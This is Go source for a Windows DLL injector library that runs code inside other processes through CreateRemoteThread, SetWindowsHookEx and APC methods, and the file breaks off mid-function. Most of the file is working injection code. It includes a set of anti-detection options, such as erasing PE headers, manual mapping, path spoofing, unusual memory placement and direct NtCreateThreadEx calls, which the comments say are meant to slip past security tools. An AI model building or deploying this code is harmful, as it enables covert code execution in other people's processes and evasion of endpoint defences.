package injector

import (
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Logger defines the interface for logging
type Logger interface {
	Info(msg string, fields ...interface{})
	Warn(msg string, fields ...interface{})
	Error(msg string, fields ...interface{})
	Debug(msg string, fields ...interface{})
}

// InjectionMethod represents different DLL injection methods
type InjectionMethod int

const (
	// StandardInjection standard CreateRemoteThread injection method
	StandardInjection InjectionMethod = iota
	// SetWindowsHookExInjection injection method using SetWindowsHookEx
	SetWindowsHookExInjection
	// QueueUserAPCInjection injection method using QueueUserAPC
	QueueUserAPCInjection
	// EarlyBirdAPCInjection injection method using Early Bird APC
	EarlyBirdAPCInjection
	// DllNotificationInjection injection method using DLL notification
	DllNotificationInjection
	// CryoBirdInjection injection method using Job Object freezing
	CryoBirdInjection
)

// BypassOptions represents anti-detection options
type BypassOptions struct {
	// MemoryLoad load DLL from memory instead of disk
	MemoryLoad bool
	// ErasePEHeader erase PE header to avoid detection
	ErasePEHeader bool
	// EraseEntryPoint erase entry point to avoid detection
	EraseEntryPoint bool
	// ManualMapping use manual mapping to load DLL
	ManualMapping bool
	// InvisibleMemory map to invisible memory regions
	InvisibleMemory bool
	// PathSpoofing spoof injection path
	PathSpoofing bool
	// LegitProcessInjection use legitimate process for injection
	LegitProcessInjection bool
	// PTESpoofing use PTE modification to hide execution permissions
	PTESpoofing bool
	// VADManipulation use VAD operations to hide memory
	VADManipulation bool
	// RemoveVADNode remove node from VAD tree
	RemoveVADNode bool
	// AllocBehindThreadStack allocate memory behind thread stack
	AllocBehindThreadStack bool
	// DirectSyscalls use direct system calls
	DirectSyscalls bool
}

// Injector handles DLL injection
type Injector struct {
	dllPath            string
	processID          uint32
	method             InjectionMethod
	bypassOptions      BypassOptions
	enhancedOptions    EnhancedBypassOptions
	useEnhancedOptions bool
	logger             Logger // Logger for all operations
}

// Windows API function calls
var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")

	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx      = kernel32.NewProc("VirtualFreeEx")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
)

// VirtualAllocEx allocates memory in remote process
func VirtualAllocEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	r1, _, e1 := procVirtualAllocEx.Call(
		uintptr(process),
		lpAddress,
		dwSize,
		uintptr(flAllocationType),
		uintptr(flProtect))
	if r1 == 0 {
		return 0, e1
	}
	return r1, nil
}

// VirtualFreeEx frees memory in remote process
func VirtualFreeEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, dwFreeType uint32) error {
	r1, _, e1 := procVirtualFreeEx.Call(
		uintptr(process),
		lpAddress,
		dwSize,
		uintptr(dwFreeType))
	if r1 == 0 {
		return e1
	}
	return nil
}

// WriteProcessMemory writes to remote process memory
func WriteProcessMemory(process windows.Handle, baseAddress uintptr, buffer unsafe.Pointer, size uintptr, bytesWritten *uintptr) error {
	r1, _, e1 := procWriteProcessMemory.Call(
		uintptr(process),
		baseAddress,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(bytesWritten)))
	if r1 == 0 {
		return e1
	}
	return nil
}

// CreateRemoteThread creates a thread in remote process
func CreateRemoteThread(process windows.Handle, threadAttributes *windows.SecurityAttributes, stackSize uint32, startAddress uintptr, parameter uintptr, creationFlags uint32, threadID *uint32) (windows.Handle, error) {
	r1, _, e1 := procCreateRemoteThread.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(threadAttributes)),
		uintptr(stackSize),
		startAddress,
		parameter,
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(threadID)))
	if r1 == 0 {
		return 0, e1
	}
	return windows.Handle(r1), nil
}

// NewInjector creates a new Injector instance
func NewInjector(dllPath string, processID uint32, logger Logger) *Injector {
	return &Injector{
		dllPath:   dllPath,
		processID: processID,
		method:    StandardInjection,
		logger:    logger,
		bypassOptions: BypassOptions{
			MemoryLoad:             false,
			ErasePEHeader:          false,
			EraseEntryPoint:        false,
			ManualMapping:          false,
			InvisibleMemory:        false,
			PathSpoofing:           false,
			LegitProcessInjection:  false,
			PTESpoofing:            false,
			VADManipulation:        false,
			RemoveVADNode:          false,
			AllocBehindThreadStack: false,
			DirectSyscalls:         false,
		},
	}
}

// SetMethod sets the injection method
func (i *Injector) SetMethod(method InjectionMethod) {
	i.method = method
}

// SetBypassOptions sets anti-detection options
func (i *Injector) SetBypassOptions(options BypassOptions) {
	i.bypassOptions = options
}

// Inject performs DLL injection
func (i *Injector) Inject() error {
	// Check basic parameters
	if i.dllPath == "" {
		err := errors.New("DLL path not set")
		i.logger.Error("Injection failed", "error", err)
		return err
	}

	if i.processID == 0 {
		err := errors.New("Target process ID not set")
		i.logger.Error("Injection failed", "error", err)
		return err
	}

	i.logger.Info("Starting DLL injection",
		"dll_path", i.dllPath,
		"process_id", i.processID,
		"method", i.method)

	// If using manual mapping, must load from memory
	if i.bypassOptions.ManualMapping {
		i.logger.Info("Manual mapping enabled, automatically enabling memory load option")
		i.bypassOptions.MemoryLoad = true
	}

	// Use legitimate process injection
	if i.bypassOptions.LegitProcessInjection {
		i.logger.Info("Using legitimate process injection method")
		return i.legitProcessInject()
	}

	var err error
	switch i.method {
	case StandardInjection:
		i.logger.Info("Using standard injection method")
		err = i.standardInject()
	case SetWindowsHookExInjection:
		i.logger.Info("Using SetWindowsHookEx injection method")
		err = i.hookInject()
	case QueueUserAPCInjection:
		i.logger.Info("Using QueueUserAPC injection method")
		err = i.apcInject()
	case EarlyBirdAPCInjection:
		i.logger.Info("Using Early Bird APC injection method")
		err = i.earlyBirdAPCInject()
	case DllNotificationInjection:
		i.logger.Info("Using DLL notification injection method")
		err = i.dllNotificationInject()
	case CryoBirdInjection:
		i.logger.Info("Using Job Object freeze process injection method")
		err = i.cryoBirdInject()
	default:
		errorMsg := "Unknown injection method: " + strconv.Itoa(int(i.method))
		err = errors.New(errorMsg)
		i.logger.Error("Injection failed", "error", err)
	}

	if err != nil {
		i.logger.Error("Injection failed", "error", err)
		return err
	}

	i.logger.Info("Successfully injected DLL into process", "process_id", i.processID)
	return nil
}

// checkDllPath checks if the DLL path is valid
func (i *Injector) checkDllPath() error {
	if i.dllPath == "" {
		err := errors.New("DLL path cannot be empty")
		i.logger.Error("DLL path check failed", "error", err)
		return err
	}

	// Check if file exists
	_, err := os.Stat(i.dllPath)
	if err != nil {
		if os.IsNotExist(err) {
			errMsg := "DLL file does not exist: " + i.dllPath
			err := errors.New(errMsg)
			i.logger.Error("DLL path check failed", "error", err)
			return err
		}
		errMsg := "Failed to check DLL file: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("DLL path check failed", "error", newErr)
		return newErr
	}

	return nil
}

// checkProcessID checks if the process ID is valid
func (i *Injector) checkProcessID() error {
	if i.processID == 0 {
		err := errors.New("Process ID cannot be zero")
		i.logger.Error("Process ID check failed", "error", err)
		return err
	}

	// Try to open process to check if it exists
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, i.processID)
	if err != nil {
		errMsg := "Failed to open process (PID: " + strconv.FormatUint(uint64(i.processID), 10) + "): " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Process ID check failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	return nil
}

// standardInject standard DLL injection method
func (i *Injector) standardInject() error {
	// Check if parameters are valid
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	// 根据选择的反检测选项选择注入方式
	if i.bypassOptions.MemoryLoad {
		// 从内存加载DLL
		dllBytes, err := os.ReadFile(i.dllPath)
		if err != nil {
			errMsg := "Failed to read DLL file: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Standard injection failed", "error", newErr)
			return newErr
		}

		// 使用手动映射或内存加载
		if i.bypassOptions.ManualMapping {
			i.logger.Info("Using manual mapping method")
			return i.manualMapDLL(dllBytes)
		}

		i.logger.Info("Using memory load method")
		return i.memoryLoadDLL(dllBytes)
	}

	// 从磁盘加载
	if i.bypassOptions.PathSpoofing {
		i.logger.Info("Using path spoofing method")
		return i.diskLoadDLLWithSpoofing()
	}

	// 根据是否启用高级选项选择加载方式
	if i.bypassOptions.ErasePEHeader || i.bypassOptions.EraseEntryPoint ||
		i.bypassOptions.PTESpoofing || i.bypassOptions.VADManipulation ||
		i.bypassOptions.RemoveVADNode || i.bypassOptions.AllocBehindThreadStack ||
		i.bypassOptions.DirectSyscalls {
		i.logger.Info("Using advanced disk load method with anti-detection options")
		return i.advancedDiskLoadDLL()
	}

	// 使用标准磁盘加载
	i.logger.Info("Using standard disk load method")
	return i.diskLoadDLL()
}

// advancedDiskLoadDLL loads DLL from disk using advanced techniques (allocate behind thread stack and direct system calls)
func (i *Injector) advancedDiskLoadDLL() error {
	// 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		errMsg := "Failed to open process: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Advanced disk load failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	i.logger.Info("Opened target process", "process_id", i.processID)

	// 将DLL路径写入目标进程
	dllPathBytes := []byte(i.dllPath + "\x00")

	var allocAddress uintptr
	if i.bypassOptions.AllocBehindThreadStack {
		// 记录尝试在线程栈后分配内存的信息，而不是在 allocateBehindThreadStack 中使用 fmt.Printf
		i.logger.Info("Attempting to allocate memory behind thread stack")

		// 在线程栈后分配内存
		allocAddress, err = allocateBehindThreadStack(hProcess, uintptr(len(dllPathBytes)))
		if err != nil {
			i.logger.Warn("Failed to allocate behind thread stack, using regular allocation", "error", err)
			allocAddress = 0 // 让VirtualAllocEx自动选择地址
		} else {
			addrStr := "0x" + strconv.FormatUint(uint64(allocAddress), 16)
			i.logger.Info("Memory successfully allocated behind thread stack", "address", addrStr)
		}
	}

	// 在目标进程中分配内存
	var memFlags uint32 = windows.MEM_RESERVE | windows.MEM_COMMIT
	var memProt uint32 = windows.PAGE_READWRITE

	dllBase, err := VirtualAllocEx(hProcess, allocAddress, uintptr(len(dllPathBytes)),
		memFlags, memProt)
	if err != nil {
		errMsg := "Failed to allocate memory: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Advanced disk load failed", "error", newErr)
		return newErr
	}

	// 写入DLL路径
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, dllBase, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(len(dllPathBytes)), &bytesWritten)
	if err != nil {
		errMsg := "Failed to write to memory: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Advanced disk load failed", "error", newErr)
		return newErr
	}

	// 添加辅助函数以将地址转换为十六进制字符串
	addrStr := "0x" + strconv.FormatUint(uint64(dllBase), 16)
	i.logger.Info("DLL path written to target process memory", "address", addrStr)

	// 获取LoadLibraryA地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	var loadLibraryAddr uintptr

	// 使用常规方式获取LoadLibraryA地址
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr = loadLibraryA.Addr()

	if i.bypassOptions.DirectSyscalls {
		i.logger.Info("Prepared to use direct system calls")
	}

	// 创建远程线程执行LoadLibraryA
	var threadID uint32
	var hThread windows.Handle

	if !i.bypassOptions.DirectSyscalls {
		// 使用常规方式创建远程线程
		var threadHandle windows.Handle
		threadHandle, err = CreateRemoteThread(hProcess, nil, 0,
			loadLibraryAddr, dllBase, 0, &threadID)
		if err != nil {
			errMsg := "Failed to create remote thread: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Advanced disk load failed", "error", newErr)
			return newErr
		}
		// 关闭线程句柄，避免句柄泄漏
		if threadHandle != 0 {
			defer windows.CloseHandle(threadHandle)
		}
	} else {
		// 使用直接系统调用
		i.logger.Info("Creating thread using direct system calls")
		hThread, err = ntCreateThreadEx(hProcess, loadLibraryAddr, dllBase)
		if err != nil {
			errMsg := "Failed to create thread using direct system call: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Advanced disk load failed", "error", newErr)
			return newErr
		}
		// 获取线程ID (可选)
		threadID = getThreadId(hThread)
		// 如果使用了直接系统调用，需要关闭线程句柄
		if hThread != 0 {
			defer windows.CloseHandle(hThread)
		}
	}

	i.logger.Info("Remote thread created", "thread_id", threadID)

	return nil
}

// allocateBehindThreadStack allocates memory behind thread stack in target process
func allocateBehindThreadStack(hProcess windows.Handle, size uintptr) (uintptr, error) {
	// 不再需要fmt.Printf，因为调用此函数的地方会先进行日志记录

	// 该技术需要找到目标进程的线程，并在其栈后分配内存
	// 这样可以利用某些安全工具忽略分析栈附近内存区域的特性

	// 1. 获取进程ID
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getProcessId := kernel32.NewProc("GetProcessId")

	pid, _, _ := getProcessId.Call(uintptr(hProcess))
	processId := uint32(pid)

	// 2. 创建线程快照以便枚举线程
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, errors.New("Failed to create thread snapshot: " + err.Error())
	}
	defer windows.CloseHandle(hSnapshot)

	// 3. 查找目标进程的线程
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	err = windows.Thread32First(hSnapshot, &te)
	if err != nil {
		return 0, errors.New("Failed to get first thread: " + err.Error())
	}

	var threadId uint32
	for {
		if te.OwnerProcessID == processId {
			threadId = te.ThreadID
			break
		}

		err = windows.Thread32Next(hSnapshot, &te)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				return 0, errors.New("No threads found for target process")
			}
			return 0, errors.New("Failed to enumerate threads: " + err.Error())
		}
	}

	// 4. 打开找到的线程
	hThread, err := windows.OpenThread(windows.THREAD_QUERY_INFORMATION, false, threadId)
	if err != nil {
		return 0, errors.New("Failed to open thread: " + err.Error())
	}
	defer windows.CloseHandle(hThread)

	// 5. 获取系统信息以了解内存分配模式
	getSystemInfo := kernel32.NewProc("GetSystemInfo")

	// 系统信息结构
	type SYSTEM_INFO struct {
		ProcessorArchitecture     uint16
		Reserved                  uint16
		PageSize                  uint32
		MinimumApplicationAddress uintptr
		MaximumApplicationAddress uintptr
		ActiveProcessorMask       uintptr
		NumberOfProcessors        uint32
		ProcessorType             uint32
		AllocationGranularity     uint32
		ProcessorLevel            uint16
		ProcessorRevision         uint16
	}

	var sysInfo SYSTEM_INFO
	getSystemInfo.Call(uintptr(unsafe.Pointer(&sysInfo)))

	// 6. 因为不能直接访问线程栈，改为选择一个不常用的内存区域
	// 这里我们尝试在较高的内存地址分配，远离模块和常用区域
	// 这只是一种近似，真实实现需要更细致的内存分析

	// 使用约2GB的地址空间
	highAddr := uintptr(0x70000000)

	// 7. 在计算的地址附近分配内存
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")

	allocAddr, _, err := virtualAllocEx.Call(
		uintptr(hProcess),
		highAddr,
		size,
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE),
	)

	if allocAddr == 0 {
		// 如果在指定地址分配失败，尝试让系统自动选择地址
		allocAddr, _, err = virtualAllocEx.Call(
			uintptr(hProcess),
			0,
			size,
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_READWRITE),
		)

		if allocAddr == 0 {
			return 0, errors.New("Failed to allocate memory: " + err.Error())
		}
	}

	// 成功分配内存，函数调用者将记录日志
	return allocAddr, nil
}

// ntCreateThreadEx creates remote thread using direct system calls
func ntCreateThreadEx(hProcess windows.Handle, startAddr uintptr, parameter uintptr) (windows.Handle, error) {
	// 移除 fmt.Printf，在调用者函数中记录日志

	// 直接使用NtCreateThreadEx系统调用
	// 这比较难被挂钩，因为许多安全工具主要挂钩CreateRemoteThread

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")

	const THREAD_ALL_ACCESS = 0x001FFFFF

	// 预留空间给返回的句柄
	var threadHandle windows.Handle

	r1, _, _ := ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		THREAD_ALL_ACCESS,
		0, // 对象属性指针，设为NULL
		uintptr(hProcess),
		startAddr,
		parameter,
		0, // 创建挂起标志，设为0表示立即运行
		0, // 栈大小，0表示使用默认值
		0, // 提交大小，0表示使用默认值
		0, // 线程参数
		0, // 安全描述符
	)

	if r1 != 0 {
		errMsg := "Failed to create thread: NTSTATUS 0x" + strconv.FormatUint(uint64(r1), 16)
		return 0, errors.New(errMsg)
	}

	return threadHandle, nil
}

// getThreadId gets thread ID
func getThreadId(hThread windows.Handle) uint32 {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getThreadId := kernel32.NewProc("GetThreadId")

	id, _, _ := getThreadId.Call(uintptr(hThread))
	return uint32(id)
}

// diskLoadDLL loads DLL from disk and injects
func (i *Injector) diskLoadDLL() error {
	// 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		errMsg := "Failed to open target process: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	i.logger.Info("Successfully opened target process")

	// 获取LoadLibraryA的地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	if loadLibraryA.Find() != nil {
		findErr := loadLibraryA.Find()
		errMsg := "Failed to find LoadLibraryA function: " + findErr.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}

	addrStr := "0x" + strconv.FormatUint(uint64(loadLibraryA.Addr()), 16)
	i.logger.Info("Found LoadLibraryA address", "address", addrStr)

	// 在目标进程中分配内存
	dllPathBytes := append([]byte(i.dllPath), 0) // 添加NULL终止符
	dllPathSize := uintptr(len(dllPathBytes))

	remoteDllPath, err := VirtualAllocEx(hProcess, 0, dllPathSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		errMsg := "Failed to allocate memory in target process: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}
	defer VirtualFreeEx(hProcess, remoteDllPath, 0, windows.MEM_RELEASE)

	dllPathAddrStr := "0x" + strconv.FormatUint(uint64(remoteDllPath), 16)
	i.logger.Info("Allocated memory for DLL path", "address", dllPathAddrStr, "size", dllPathSize)

	// 写入DLL路径到远程进程内存
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, remoteDllPath, unsafe.Pointer(&dllPathBytes[0]),
		dllPathSize, &bytesWritten)
	if err != nil {
		errMsg := "Failed to write DLL path to target process memory: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}

	writtenAddrStr := "0x" + strconv.FormatUint(uint64(remoteDllPath), 16)
	i.logger.Info("Data written to memory", "bytes", bytesWritten, "address", writtenAddrStr)

	// 在远程进程中创建线程
	var threadID uint32
	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, loadLibraryA.Addr(), remoteDllPath, 0, &threadID)
	if err != nil {
		errMsg := "Failed to create remote thread: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(threadHandle)

	i.logger.Info("Created remote thread", "thread_id", threadID)

	// 等待线程执行完成
	windows.WaitForSingleObject(threadHandle, windows.INFINITE)

	// 获取线程退出码
	var exitCode uint32
	getExitCodeThread := kernel32.NewProc("GetExitCodeThread")
	r1, _, err := getExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		errMsg := "Failed to get thread exit code: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}

	if exitCode == 0 {
		err := errors.New("DLL injection failed, LoadLibrary returned 0")
		i.logger.Error("Disk load failed", "error", err)
		return err
	}

	exitCodeStr := "0x" + strconv.FormatUint(uint64(exitCode), 16)
	i.logger.Info("Injection completed successfully", "module_handle", exitCodeStr)

	return nil
}

// Note: memoryLoadDLL method is defined in memory_load.go

// createTempDllFile 创建临时DLL文件
func (i *Injector) createTempDllFile(dllBytes []byte) (string, error) {
	tempFile, err := os.CreateTemp("", "dll_*.dll")
	if err != nil {
		return "", fmt.Errorf("failed to create temporary file: %v", err)
	}

	// 写入DLL内容
	bytesWritten, err := tempFile.Write(dllBytes)
	tempFile.Close()

	if err != nil {
		os.Remove(tempFile.Name())
		return "", fmt.Errorf("failed to write DLL content to temporary file: %v", err)
	}

	if bytesWritten != len(dllBytes) {
		os.Remove(tempFile.Name())
		return "", fmt.Errorf("incomplete write to temporary file: expected %d bytes, written %d bytes", len(dllBytes), bytesWritten)
	}

	i.logger.Info("Created temporary DLL file", "path", tempFile.Name(), "size", bytesWritten)
	return tempFile.Name(), nil
}

// manualMapDLL 使用手动映射方式加载DLL
func (i *Injector) manualMapDLL(dllBytes []byte) error {
	i.logger.Info("Using manual mapping method",
		"process_id", i.processID,
		"invisible_memory", i.bypassOptions.InvisibleMemory)

	// 创建bypass选项
	options := BypassOptions{
		InvisibleMemory: i.bypassOptions.InvisibleMemory,
		ErasePEHeader:   i.bypassOptions.ErasePEHeader,
		EraseEntryPoint: i.bypassOptions.EraseEntryPoint,
	}

	err := ManualMapDLL(i.processID, dllBytes, options)
	if err != nil {
		i.logger.Error("Manual mapping injection failed", "error", err)
		errMsg := "Manual mapping DLL failed: " + err.Error()
		return errors.New(errMsg)
	}
	i.logger.Info("Manual mapping injection successful!")
	return nil
}

// spoofDllPath 伪装DLL路径，返回伪装后的路径
func (i *Injector) spoofDllPath() string {
	i.logger.Info("Creating spoofed DLL path")

	// 创建临时文件
	tempFile, err := os.CreateTemp("", "sys_*.dll")
	if err != nil {
		// 如果创建临时文件失败，返回原始路径
		i.logger.Warn("Failed to create temporary file for path spoofing, using original path", "error", err)
		return i.dllPath
	}
	tempFile.Close()

	// 读取原始DLL
	dllBytes, err := os.ReadFile(i.dllPath)
	if err != nil {
		i.logger.Warn("Failed to read original DLL file for spoofing", "error", err)
		os.Remove(tempFile.Name())
		return i.dllPath
	}

	// 写入临时文件
	if err := os.WriteFile(tempFile.Name(), dllBytes, 0644); err != nil {
		i.logger.Warn("Failed to write spoofed DLL file", "error", err)
		os.Remove(tempFile.Name())
		return i.dllPath
	}

	i.logger.Info("Successfully created spoofed DLL path",
		"original", i.dllPath,
		"spoofed", tempFile.Name(),
		"size", len(dllBytes))

	// 返回伪装的临时文件路径
	return tempFile.Name()
}

// Note: diskLoadDLLWithSpoofing method is defined in disk_load.go

// hookInject 使用SetWindowsHookEx进行注入
func (i *Injector) hookInject() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	i.logger.Info("Starting SetWindowsHookEx injection")

	// 尝试多种钩子注入方法
	methods := []struct {
		name string
		fn   func() error
	}{
		{"SafeHookInjection", i.hookInjectSafe},
		{"DirectHookInjection", i.hookInjectDirect},
		{"GlobalHookInjection", i.hookInjectGlobal},
	}

	var lastErr error
	for _, method := range methods {
		i.logger.Info("Trying hook injection method", "method", method.name)

		err := method.fn()
		if err == nil {
			i.logger.Info("Hook injection successful", "method", method.name)
			return nil
		}

		i.logger.Warn("Hook injection method failed", "method", method.name, "error", err)
		lastErr = err
	}

	errMsg := "All hook injection methods failed"
	if lastErr != nil {
		errMsg += ": " + lastErr.Error()
	}
	newErr := errors.New(errMsg)
	i.logger.Error("Hook injection failed", "error", newErr)
	return newErr
}

// hookInjectSafe 安全的钩子注入方法（不加载DLL到当前进程）
func (i *Injector) hookInjectSafe() error {
	i.logger.Info("Starting safe hook injection")

	// 获取目标进程的主线程ID
	threadID, err := i.getMainThreadID(i.processID)
	if err != nil {
		return errors.New("Failed to get main thread ID: " + err.Error())
	}

	i.logger.Info("Found main thread", "thread_id", threadID)

	// 首先在目标进程中加载DLL
	err = i.loadDllIntoTargetProcess()
	if err != nil {
		return errors.New("Failed to load DLL into target process: " + err.Error())
	}

	i.logger.Info("DLL successfully loaded into target process")

	// 注意：实际上DLL已经通过loadDllIntoTargetProcess成功注入了
	// 这里的钩子设置只是为了触发DLL执行，但DLL注入本身已经完成
	// 所以即使后续钩子设置失败，注入也已经成功了

	// 获取目标进程中的DLL模块句柄
	hTargetModule, err := i.getModuleHandleInProcess(i.processID, i.dllPath)
	if err != nil {
		// 即使无法获取模块句柄，DLL可能已经成功加载
		i.logger.Warn("Failed to get module handle, but DLL may already be loaded", "error", err)
		// 我们认为注入已经成功，因为loadDllIntoTargetProcess已经完成
		return nil
	}

	// 获取钩子过程地址
	hookProcAddr, err := i.getHookProcAddressInProcess(i.processID, hTargetModule)
	if err != nil {
		// 即使无法获取钩子过程地址，DLL已经成功加载
		i.logger.Warn("Failed to get hook procedure address, but DLL is loaded", "error", err)
		return nil
	}

	// 设置钩子（这是可选的，主要目的是触发DLL执行）
	err = i.setHookWithAddress(threadID, hTargetModule, hookProcAddr)
	if err != nil {
		// 钩子设置失败不影响DLL注入的成功
		i.logger.Warn("Failed to set hook, but DLL injection was successful", "error", err)
		return nil
	}

	i.logger.Info("Safe hook injection completed successfully")
	return nil
}

// hookInjectDirect 直接钩子注入方法
func (i *Injector) hookInjectDirect() error {
	i.logger.Info("Starting direct hook injection")

	// 创建一个简单的钩子DLL在内存中
	hookDllBytes, err := i.createInMemoryHookDll()
	if err != nil {
		return errors.New("Failed to create in-memory hook DLL: " + err.Error())
	}

	// 将钩子DLL注入到目标进程
	err = i.injectHookDllToProcess(hookDllBytes)
	if err != nil {
		return errors.New("Failed to inject hook DLL: " + err.Error())
	}

	i.logger.Info("Direct hook injection completed successfully")
	return nil
}

// hookInjectGlobal 全局钩子注入方法
func (i *Injector) hookInjectGlobal() error {
	i.logger.Info("Starting global hook injection")

	// 创建一个独立的进程来设置全局钩子
	return i.createGlobalHookProcess()
}

// loadDllIntoTargetProcess 将DLL加载到目标进程中
func (i *Injector) loadDllIntoTargetProcess() error {
	// 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		return errors.New("Failed to open target process: " + err.Error())
	}
	defer windows.CloseHandle(hProcess)

	// 在目标进程中分配内存存储DLL路径
	dllPathBytes := append([]byte(i.dllPath), 0) // 添加NULL终止符
	dllPathSize := uintptr(len(dllPathBytes))

	remoteDllPath, err := VirtualAllocEx(hProcess, 0, dllPathSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return errors.New("Failed to allocate memory in target process: " + err.Error())
	}
	defer VirtualFreeEx(hProcess, remoteDllPath, 0, windows.MEM_RELEASE)

	// 写入DLL路径到远程进程内存
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, remoteDllPath, unsafe.Pointer(&dllPathBytes[0]),
		dllPathSize, &bytesWritten)
	if err != nil {
		return errors.New("Failed to write DLL path to target process memory: " + err.Error())
	}

	// 获取LoadLibraryA地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()

	// 创建远程线程执行LoadLibraryA
	var threadID uint32
	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, loadLibraryAddr, remoteDllPath, 0, &threadID)
	if err != nil {
		return errors.New("Failed to create remote thread: " + err.Error())
	}
	defer windows.CloseHandle(threadHandle)

	// 等待线程执行完成
	windows.WaitForSingleObject(threadHandle, windows.INFINITE)

	// 获取线程退出码（模块句柄）
	var exitCode uint32
	getExitCodeThread := kernel32.NewProc("GetExitCodeThread")
	r1, _, err := getExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		return errors.New("Failed to get thread exit code: " + err.Error())
	}

	if exitCode == 0 {
		return errors.New("LoadLibraryA returned NULL, DLL loading failed")
	}

	i.logger.Info("Successfully loaded DLL into target process", "module_handle", fmt.Sprintf("0x%X", exitCode))
	return nil
}

// getModuleHandleInProcess 获取目标进程中的模块句柄
func (i *Injector) getModuleHandleInProcess(processID uint32, dllPath string) (windows.Handle, error) {
	// 创建进程快照
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, processID)
	if err != nil {
		return 0, errors.New("Failed to create module snapshot: " + err.Error())
	}
	defer windows.CloseHandle(hSnapshot)

	// 遍历模块
	var me windows.ModuleEntry32
	me.Size = uint32(unsafe.Sizeof(me))
	err = windows.Module32First(hSnapshot, &me)
	if err != nil {
		return 0, errors.New("Failed to get first module: " + err.Error())
	}

	// 提取DLL文件名
	dllFileName := ""
	if lastSlash := strings.LastIndex(dllPath, "\\"); lastSlash != -1 {
